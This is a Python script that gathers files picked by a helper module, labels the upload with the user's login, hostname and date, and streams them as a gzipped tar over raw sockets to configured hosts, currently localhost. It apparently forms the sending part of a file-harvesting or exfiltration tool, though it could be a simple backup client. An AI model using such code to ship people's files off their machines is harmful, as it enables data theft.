import os
import socket
import tarfile
import time
from pathlib import Path
from typing import Iterable, List, Union
import speedtest
import time

from get_importent_files import select_files_for_transfer, get_selected_files

MAX_SECONDS = 120
MIN_SPEED_MBIT = 5



SKIP_EXTANSIONS = {".mp4", ".mp3", ".png", ".jpeg"} # skip too big

HOST_1 = "127.0.0.1"
PORT_1 = 9001

HOST_2 = "127.0.0.1"
PORT_2 = 9000



def retry(func, retries: int = 5, delay: float = 1.0, *args, **kwargs):
    last_err = None

    for i in range(retries):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            last_err = e
            time.sleep(delay)

    raise last_err


def send_string(host: str, port: int, data: str):
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(data.encode())


def send_tar_stream(host: str, port: int, paths: List[Path]):
    with socket.create_connection((host, port), timeout=10) as s:
        fileobj = s.makefile("wb")

        with tarfile.open(fileobj=fileobj, mode="w:gz") as tar:
            for p in paths:
                p = Path(p)

                if p.is_file():
                    tar.add(p, arcname=p.name)

                elif p.is_dir():
                    for f in p.rglob("*"):
                        if f.is_file():
                            arc = f.relative_to(p.parent)
                            tar.add(f, arcname=str(arc))


def send_filename(filename: str):
    retry(send_string, 5, 1, HOST_1, PORT_1, filename)


def send_files_using_path(paths: Iterable[Union[str, Path]]):
    clean_paths = [Path(p) for p in paths]
    retry(send_tar_stream, 5, 1, HOST_2, PORT_2, clean_paths)

def send_files_using_selected_files_from_get_importent(files: Iterable[dict]):

    clean_paths = [
        Path(file["path"])
        for file in files
    ]

    retry(
        send_tar_stream,
        5,
        1,
        HOST_2,
        PORT_2,
        clean_paths
    )




if __name__ == "__main__":
    USER_NAME = os.getlogin()
    HOST_NAME = os.uname().nodename
    DATE = time.strftime("%Y-%m-%d_%H-%M-%S")

    FILE_NAME = f"{USER_NAME}_{HOST_NAME}_{DATE}.tar.gz"

    send_filename(FILE_NAME)

    PATHS = [
        Path.home() / "Desktop" / "myapp"#,   
    ]

    time.sleep(2)

    files = get_selected_files()

    clean_paths = [f["path"] for f in files]

    send_files_using_path(clean_paths)